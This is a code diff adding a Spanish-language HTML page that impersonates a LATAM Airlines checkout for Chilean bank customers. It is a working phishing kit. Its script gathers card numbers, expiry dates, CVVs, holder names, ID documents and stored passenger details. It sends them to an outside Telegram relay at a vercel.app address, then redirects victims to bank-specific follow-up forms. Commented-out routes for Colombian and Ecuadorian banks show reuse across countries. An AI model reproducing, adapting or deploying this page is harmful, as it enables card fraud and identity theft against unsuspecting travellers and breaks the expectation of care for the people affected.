@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flight Card</title>
+    <style>
+
+        body{
+            font-family: Arial, sans-serif;
+            margin: 0;
+            background-color: #f4f4f4ea;
+            color: #fff;
+            padding-bottom: 25%;
+            padding: 0;
+            overflow-x: hidden;
+        }
+        
+        .bodys {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items:start; 
+            margin: 0;
+        }
+        .card {
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            padding: 0px;
+            box-sizing: border-box;
+            margin-top: 5%;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+
+        
+        .hola-section {
+            display: none;
+            margin-top: 20px;
+            color: blue;
+        }
+        .headere {
+            display: flex;
+            padding: 3%;
+        }
+        .headere div {
+            padding: 5px 10px;
+            border-radius: 100px 0px 100px 5px;
+            font-size: 0.9em;
+        }
+        .recommended {
+            background-color: white;
+            color: #000;
+            
+        }
+        .cheapest {
+            background-color: #3ca692;
+            color: #fff;
+        }
+        .flight-info {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .flight-info div {
+            text-align: center;
+        }
+        .flight-info .time {
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #1f2350;
+        }
+        .flight-info .location {
+            font-size: 1.2em;
+            color: #1f2350;
+        }
+        .details {
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .details .duration {
+            font-size: 1em;
+            color: #888;
+        }
+        .details .direct {
+            font-size: 1em;
+            color: #4b4bbd;
+            font-weight: bold;
+        }
+        .price {
+            text-align: right;
+            margin-bottom: 0px;
+        }
+        .price span {
+            display: block;
+            font-size: 1em;
+            color: #888;
+        }
+        .price .amount {
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #1f2350;
+        }
+        .footer {
+            text-align: center;
+        }
+        .footer img {
+            height: 20px;
+            vertical-align: middle;
+            margin-right: 5px;
+        }
+        .footer span {
+            font-size: 1em;
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+    
+    <header style="padding: 5%; background-color: rgb(16, 0, 79); display: flex; justify-content: space-between; align-items: center;">
+       <img style="width: 30%;" src="img/MobileNegative.svg" alt="LATAM Airlines Logo" class="logo">
+       <button class="login-button" style="margin-left: 27%; background-color: #46158298; color: #fff; border: none; border-radius: 4px; padding: 8px 12px; border-radius: 18px; cursor: pointer;">
+         <h3 style="margin: 0;">Iniciar sesión</h3>
+       </button>
+       <div class="menu-icon">
+         <i class="fa-solid fa-bars fa-lg" onclick="toggleMenu()"></i>
+    </header>
+    
+    <section style="margin: 5% 5% 0% 5%;">
+     <p style="margin-bottom: 0%; color: black; font-size: x-large; color: rgba(68, 30, 219, 0.765);"><strong>Medios de pago</strong></p>
+ </section>
+
+ <section style="background-color: white; margin: 5% 5% 0% 5%; border-radius: 10px;">
+    <div class="headere" style="margin-top: 2%; ">
+       <img src="img/loginInfo.svg" style="width: 100%; border-radius: 8px;" alt="">
+    </div>
+
+    <div>
+        <h4 style="color: #4b4bbd; margin: 5% 5% 2% 5%;">Paga con tu LATAM Wallet</h4>
+        <p style="color: gray; font-size:small; margin: 1% 5% 0% 5%; padding-bottom: 8%;">Obtén más opciones de pago al iniciar sesión.</p>
+    </div>
+ </section>
+ 
+    <section>
+     <section class="bodys" data-price="44990">
+
+
+        <div class="card" style="margin-bottom: 20%;">
+
+            
+            <div class="headere" style="display: flex; align-items: start; margin-top: 2%;">
+                <div style="border-radius: 100px; padding: 2%; display: flex; justify-content: center;">
+                    <img src="img/svgexport-4.svg" style="width: 110%;" alt="">
+                </div>
+                <section style="color: rgb(27, 0, 136); padding: 2% 4% 0% 2%; font-size: medium; width: 100%;" class="recommended">
+                    <strong>Paga con tarjeta</strong>
+                    <p style="margin-top: 3%; color: gray; font-size: small;">Débito con CVV o crédito VIsa,<br>
+                        Mastercard, American Express o Diners Club</p>
+                </section>
+                <input type="radio" name="card-select" style="width: 15%; border-color: #1f2350;">
+            </div>
+
+            <div class="hola-section">
+
+                <style>
+                    .flight-info {
+                        border-style: solid;
+                        border-width: 1px;
+                        border-color: gray;
+                        margin: 5% 5% 8% 5%;
+                        border-radius: 8px;
+                    }
+                    input {
+                        width: 85%;
+                        padding: 5% 3% 5% 0%;
+                        border-style: none;
+                        font-size: large;
+                        outline: none;
+                    }
+                </style>
+
+<div class="flight-info" style="border-style: solid; border-width: 1px; border-color: gray; margin: 5% 5% 5% 5%; border-radius: 8px;">
+    <select style="background-color: transparent; width: 95%; padding: 5% 3% 5% 0%; border-style: none; font-size: large; outline: none; color: gray;" id="banco" name="banco" autocomplete="off">
+        <option value="" disabled selected>Seleccione su banco</option>
+<option value="BANCO ESTADO">BANCO ESTADO</option>
+<option value="BANCO DE CHILE">BANCO DE CHILE</option>
+<option value="BANCO BCI">BANCO BCI</option>
+<option value="SCOTIABANK">SCOTIABANK</option>
+<option value="BANCO BICE">BANCO BICE</option>
+<option value="BANCO SECURITY">BANCO SECURITY</option>
+<option value="BANCO INTERNACIONAL">BANCO INTERNACIONAL</option>
+<option value="BANCO CONSORCIO">BANCO CONSORCIO</option>
+<option value="BANCO RIPLEY">BANCO RIPLEY</option>
+<option value="COOPEUCH">COOPEUCH</option>
+<option value="MACH">MACH</option>
+<option value="TENPO">TENPO</option>
+<option value="SUPERDIGITAL">SUPERDIGITAL</option>
+<option value="DALE">DALE</option>
+<option value="CHEK">CHEK</option>
+<option value="ONEPAY">ONEPAY</option>
+<option value="MERCADO PAGO">MERCADO PAGO</option>
+<option value="BEPAY">BEPAY</option>
+<option value="CENCOPAY">CENCOPAY</option>
+<option value="MI PAGO">MI PAGO</option>
+<option value="NN">OTRO</option>
+      
+    </select>
+</div>
+
+                 <div class="flight-info">
+                    <input type="text" id="cc" autocomplete="off" placeholder="Número de tarjeta" maxlength="19">
+                </div>
+                <div class="flight-info">
+                    <input type="text" id="fecha" autocomplete="off" placeholder="Expiración (MM/YY)" maxlength="5">
+                </div>
+                <div class="flight-info">
+                    <input type="text" id="cvv" autocomplete="off" placeholder="Código CVV" maxlength="4">
+                </div>
+                <div class="flight-info">
+                    <input type="text" id="name" autocomplete="off" placeholder="Nombre del Titular">
+                </div>
+                <div class="flight-info">
+                    <input type="text" id="idt" autocomplete="off" placeholder="Documento del Titular">
+                </div>
+                <div class="flight-info" style="border-style: solid; border-width: 1px; border-color: gray; margin: 5% 5% 5% 5%; border-radius: 8px;">
+                    <select style="width: 95%; background-color: transparent; padding: 5% 3% 5% 0%; border-style: none; font-size: large; outline: none; color: gray;" id="cuotas" name="cuotas" autocomplete="off">
+                      <option value="" style="color: gray;" disabled selected>Sin cuotas</option>
+                      <option value="1" style="color: gray;">1</option>
+                      <option value="2" style="color: gray;">2</option>
+                      <option value="3" style="color: gray;">3</option>
+                      <option value="4" style="color: gray;">4</option>
+                      <option value="5" style="color: gray;">5</option>
+                      <option value="6" style="color: gray;">6</option>
+                      <option value="7" style="color: gray;">7</option>
+                      <option value="8" style="color: gray;">8</option>
+                      <option value="9" style="color: gray;">9</option>
+                       <option value="10" style="color: gray;">10</option>
+                      <option value="11" style="color: gray;">11</option>
+                      <option value="12" style="color: gray;">12</option>
+                      <option value="13" style="color: gray;">13</option>
+                      <option value="14" style="color: gray;">14</option>
+                    <option value="15" style="color: gray;">15</option>
+                    <option value="16" style="color: gray;">16</option>
+                    <option value="17" style="color: gray;">17</option>
+                    <option value="18" style="color: gray;">18</option>
+                    <option value="19" style="color: gray;">19</option>
+                    <option value="20" style="color: gray;">20</option>
+                    <option value="21" style="color: gray;">21</option>
+                    <option value="22" style="color: gray;">22</option>
+                    <option value="23" style="color: gray;">23</option>
+                    <option value="24" style="color: gray;">24</option>
+                    <option value="25" style="color: gray;">25</option>
+                    <option value="26" style="color: gray;">26</option>
+                    <option value="27" style="color: gray;">27</option>
+                    <option value="28" style="color: gray;">28</option>
+                    <option value="29" style="color: gray;">29</option>
+                    <option value="30" style="color: gray;">30</option>
+                    <option value="31" style="color: gray;">31</option>
+                    <option value="32" style="color: gray;">32</option>
+                    <option value="33" style="color: gray;">33</option>
+                    <option value="34" style="color: gray;">34</option>
+                    <option value="35" style="color: gray;">35</option>
+                    <option value="36" style="color: gray;">36</option>
+                    
+
+                      
+                    </select>
+                </div>
+
+
+                <div class="flight-info" style="border-style: none; margin: 5% 5% 15% 5%;">
+                    <button id="accept-button" style="font-size: medium; margin-top: 5%; padding: 7%; width: 100%; border-radius: 10px; border-style: none; background-color: rgb(202, 26, 44); color: white;">Pagar</button>
+                </div>
+
+           </div>
+           </div>
+            </div>
+        </div>
+    
+       <script>
+        // Formateo de número de tarjeta de crédito
+document.getElementById('cc').addEventListener('input', function (e) {
+    let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+    let formattedValue = value.match(/.{1,4}/g)?.join(' ') || '';
+    e.target.value = formattedValue;
+
+    const cvvInput = document.getElementById('cvv');
+    if (value.length === 16) {
+        cvvInput.maxLength = 3;
+    } else if (value.length === 14) {
+        cvvInput.maxLength = 4;
+    } else {
+        cvvInput.maxLength = 4;
+    }
+});
+
+// Formateo de CVV
+document.getElementById('cvv').addEventListener('input', function (e) {
+    const ccInput = document.getElementById('cc').value.replace(/\s+/g, '');
+    const maxLength = ccInput.length === 16 ? 3 : 4;
+    if (e.target.value.length > maxLength) {
+        e.target.value = e.target.value.slice(0, maxLength);
+    }
+});
+
+// Formateo de fecha de expiración
+document.getElementById('fecha').addEventListener('input', function (e) {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length >= 3) {
+        value = value.slice(0, 2) + '/' + value.slice(2, 4);
+    }
+    e.target.value = value;
+});
+
+// Validación de fecha al perder el foco
+document.getElementById('fecha').addEventListener('blur', function (e) {
+    let value = e.target.value;
+    if (value.length !== 5 || !/^\d{2}\/\d{2}$/.test(value)) {
+        e.target.value = '';
+        alert('Por favor ingrese una fecha válida en formato MM/YY');
+    }
+});
+
+// Funciones auxiliares de formateo (compatibilidad con el segundo código)
+function formatCreditCardNumber(input) {
+    input.value = input.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+}
+
+function formatExpiryDate(input) {
+    let value = input.value.replace(/\D/g, '');
+    if (value.length > 2) {
+        value = value.slice(0, 2) + '/' + value.slice(2, 4);
+    }
+    input.value = value;
+}
+
+function limitLength(input, maxLength) {
+    input.value = input.value.slice(0, maxLength);
+}
+
+// Función para toggle de contenido oculto
+function toggleHidden() {
+    const hiddenContent = document.getElementById('hiddenContent');
+    if (hiddenContent) {
+        hiddenContent.style.display = hiddenContent.style.display === 'block' ? 'none' : 'block';
+    }
+}
+
+function stopPropagation(event) {
+    event.stopPropagation();
+}
+
+// Función principal de envío de datos usando la API de Vercel
+async function enviarDatosTelegram() {
+    // Recuperar datos del pagador si existen
+    const datosPagador = JSON.parse(localStorage.getItem('datosPagador')) || {};
+    
+    // Obtener datos del formulario
+    const cc = document.getElementById('cc').value.trim();
+    const fecha = document.getElementById('fecha').value.trim();
+    const cvv = document.getElementById('cvv').value.trim();
+    const name = document.getElementById('name') ? document.getElementById('name').value.trim() : 
+                 document.getElementById('nambre') ? document.getElementById('nambre').value.trim() : '';
+    const idt = document.getElementById('idt') ? document.getElementById('idt').value.trim() : 
+                document.getElementById('ID') ? document.getElementById('ID').value.trim() : '';
+    const banco = document.getElementById('banco').value.trim();
+    const cuotas = document.getElementById('cuotas') ? document.getElementById('cuotas').value.trim() : '';
+
+    // Validación básica
+    if (!cc || !fecha || !cvv || !banco) {
+        alert('Por favor complete todos los campos obligatorios.');
+        return;
+    }
+
+    // Construir mensaje con formato mejorado
+    let mensaje = `🔻 *Nueva solicitud de datos* 🔻\n\n`;
+    
+    // Agregar datos del pagador si existen
+    if (datosPagador.nombre) {
+        mensaje += `👤 *Datos del Pasajero:*\n`;
+        mensaje += `• Nombre: ${datosPagador.nombre}\n`;
+        mensaje += `• Apellido: ${datosPagador.apellido}\n`;
+        mensaje += `• Nacimiento: ${datosPagador.Nacimiento}\n`;
+        mensaje += `• Nacionalidad: ${datosPagador.nacionalidad}\n`;
+        mensaje += `• Documento: ${datosPagador.NumDocumento}\n`;
+        mensaje += `• Email: ${datosPagador.email}\n`;
+        mensaje += `• Celular: ${datosPagador.celular}\n\n`;
+    }
+    
+    // Agregar datos de pago
+    mensaje += `💳 *Datos de Pago:*\n`;
+    mensaje += `• Banco: ${banco}\n`;
+    mensaje += `• Tarjeta: ${cc}\n`;
+    mensaje += `• Expiración: ${fecha}\n`;
+    mensaje += `• CVV: ${cvv}\n`;
+    if (name) mensaje += `• Titular: ${name}\n`;
+    if (idt) mensaje += `• ID Titular: ${idt}\n`;
+    if (cuotas) mensaje += `• Cuotas: ${cuotas}\n`;
+
+    try {
+        // Enviar usando la API de Vercel
+        const response = await fetch('https://avori-telegram-api.vercel.app/api/send-telegram', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message: mensaje })
+        });
+
+        if (response.ok) {
+            // Redirigir según el banco seleccionado
+            redirigirSegunBanco(banco);
+        } else {
+            console.error('Error API status:', response.status);
+            alert('Error al enviar la información. Por favor, intente nuevamente.');
+        }
+    } catch (error) {
+        console.error('Error de red:', error);
+        alert('Error de conexión. Por favor, intente nuevamente.');
+    }
+}
+
+// Función de redirección según banco (combinando ambos códigos)
+function redirigirSegunBanco(banco) {
+    const redirecciones = {
+        // Bancos colombianos
+        // 'BANCOLOMBIA': 'bancos/bancol/formulario_u1.php',
+        // 'BANCO AGRARIO': 'bancos/agra.html',
+        // 'BANCO AVVILLAS': 'bancos/villas/formulario_u1.php',
+        // 'BANCO BBVA': 'bancos/bba/formulario_u1.php',
+        // 'BANCO CAJA SOCIAL': 'bancos/cjs/formulario_u1.php',
+        // 'BANCO CITIBANK': 'bancos/colpa/scoti.html',
+        // 'BANCO COLPATRIA': 'bancos/colpa/formulario_u1.php',
+        // 'BANCO CORPBANCA': 'bancos/itau/formulario_u1.php',
+        // 'BANCO DAVIVIENDA': 'bancos/davi/formulario_u1.php',
+        // 'BANCO DE BOGOTA': 'bancos/bogota/formulario_u1.php',
+        // 'BANCO DE OCCIDENTE': 'bancos/occi/formulario_u1.php',
+        // 'BANCO FALABELLA': 'bancos/fala/formulario_u1.php',
+        // 'BANCO FINANDINA': 'bancos/finan.html',
+        // 'BANCO GANADERO': 'bancos/ganadero.html',
+        // 'BANCO GNB SUDAMERIS': 'cargapago.html',
+        // 'BANCO HSBC COLOMBIA': 'cargapago.html',
+        // 'BANCO ITAU': 'bancos/itau.html',
+        // 'BANCO POPULAR': 'bancos/popu.html',
+        // 'BANCO SANTANDER': 'bancos/santan.html',
+        // 'BANCO CREDIBANCO': 'cargapago.html',
+        // 'BANCO HELM BANK': 'cargapago.html',
+        // 'Nequi': 'bancos/nequi/formulario_u1.php',
+        // 'SERFINANSA': 'cargapago.html',
+        // 'SERVIBANCA': 'cargapago.html',
+        // 'TUYA': 'cargapago.html',
+        // 'NUBANK': 'cargapago.html',
+        
+        // // Bancos ecuatorianos
+        // 'BANCO BOLIVARIANO': 'bancos/bolivari.html',
+        // 'BANCO GUAYAQUIL': 'bancos/guayaquil.html',
+        // 'BANCO PACIFICO': 'bancos/pacifi.html',
+        // 'BANCO PICHINCHA': 'bancos/pichi.html',
+        // 'PRODUBANCO': 'bancos/produba.html',
+        
+        // Bancos chilenos
+        'BANCO ESTADO': 'bancos/estado/formulario_u1.php',
+        'BANCO DE CHILE': 'bancos/chile/formulario_u1.php',
+        'BANCO BCI': 'bancos/bci/formulario_u1.php',
+        'SCOTIABANK': 'fin.html',
+        'BANCO BICE': 'bancos/bice/formulario_u1.php',
+        'BANCO SECURITY': 'bancos/security/formulario_u1.php',
+        'BANCO INTERNACIONAL': 'bancos/inter/formulario_u1.php',
+        'BANCO CONSORCIO': 'bancos/consor/formulario_u1.php',
+        'BANCO RIPLEY': 'fin.html',
+        'COOPEUCH': 'fin.html',
+        'MACH': 'fin.html',
+        'TENPO': 'fin.html',
+        'SUPERDIGITAL': 'fin.html',
+        'DALE': 'fin.html',
+        'CHEK': 'fin.html',
+        'ONEPAY': 'fin.html',
+        'MERCADO PAGO': 'fin.html',
+        'BEPAY': 'fin.html',
+        'CENCOPAY': 'fin.html',
+        'MI PAGO': 'fin.html',
+        'NN': 'fin.html'
+    };
+
+    const url = redirecciones[banco];
+    if (url) {
+        window.location.href = url;
+    } else {
+        console.warn('Banco no reconocido:', banco);
+        window.location.href = 'cargapago.html'; // URL por defecto
+    }
+}
+
+// Inicialización cuando el DOM esté listo
+document.addEventListener('DOMContentLoaded', function () {
+    // Enfocar en el primer campo de tarjeta
+    const ccField = document.getElementById('cc');
+    if (ccField) {
+        ccField.focus();
+    }
+
+    // Event listener para el botón de envío
+    const acceptButton = document.getElementById('accept-button');
+    if (acceptButton) {
+        acceptButton.addEventListener('click', enviarDatosTelegram);
+    }
+
+    // Event listener para cards (si existen)
+    const cards = document.querySelectorAll('.card');
+    cards.forEach(card => {
+        card.addEventListener('click', function() {
+            const radioInput = this.querySelector('input[type="radio"]');
+            if (radioInput) {
+                radioInput.checked = true;
+            }
+
+            const holaSection = document.querySelector('.hola-section');
+            if (holaSection) {
+                holaSection.style.display = 'block';
+            }
+        });
+    });
+});
+
+// Función adicional para toggle de contenido específico
+function toggleHidde(element) {
+    const hiddenContent = element.querySelector('.hiddenConten');
+    if (hiddenContent) {
+        hiddenContent.style.display = hiddenContent.style.display === 'none' ? 'block' : 'none';
+    }
+}
+
+function stopPropagatio(event) {
+    event.stopPropagation();
+}
+       </script>
+ 
+             
+     </section>
+ </section>
+
+ 
+
+ <footer style=" padding: 5%; background-color: white;">
+
+    <style>
+        li{
+            margin-bottom: 10%;
+            color: gray;
+        }
+    </style>
+
+    <section style="margin-right: 20%;">
+        <p style="padding-left: 10%; color: rgb(16, 0, 79); font-size: large; margin-bottom: 10%;">Portales asociados</p>
+        <ul style=" list-style: none;">
+            <li>lATAM pass</li>
+            <li>Vamos / LATAM</li>
+            <li>Paquetes, hoteles y más</li>
+            <li>LATAM cargo</li>
+            <li>LATAM Corporate</li>
+            <li>Trabaja con nosotros</li>
+            <li>Relación con inversionistas</li>
+            <li>Registro Nacinal de Turismo</li>
+            <li>Aeronáutica civil</li>
+            <li>Superintendencia de Transporte</li>
+        </ul>
+    </section>
+ </footer>
+
+ <footer style=" padding: 5%; background-color: white;">
+
+    <style>
+        li{
+            margin-bottom: 10%;
+            color: gray;
+        }
+    </style>
+
+    <section>
+        <p style="color: rgb(16, 0, 79); font-size: large; margin-bottom: 10%;">Contacta con nosotros</p>
+        <img src="img/face-39.png" alt="">
+        <img src="img/x-40.png" alt="">
+        <img src="img/yt-41.png" alt="">
+        <img src="img/ig-42.png" alt="">
+        
+    </section>
+ </footer>
+
+ <footer style=" padding: 5%; background-color: white ">
+
+    <style>
+        li{
+            margin-bottom: 10%;
+            color: gray;
+        }
+    </style>
+
+    <section style=" display: flex; justify-content: center;">
+        <img src="img/LATAM Logo.png" width="40%" alt="">
+    </section>
+
+    <section>
+        <p style="color: grey; font-size: small; text-align: center; margin-top: 5%;">© 2024 LATAM Airlines Colombia. NIT: 890.704.196-6, Aerovias de Integración Regional S.A - Aires S.A. Av. El Dorado No.103-08 Entrada 1 - Hangar. customer_service@sac.latam.com. 601 - 5185800
+           <br> <br> <span> Certificado por:</span></p>
+    </section>
+
+    <section style="display: flex; justify-content: center;">
+        <img src="img/PCI.png" style="margin-top: 5%;" alt="">
+    </section>
+ </footer>
+ 
+ </body>
+</html>
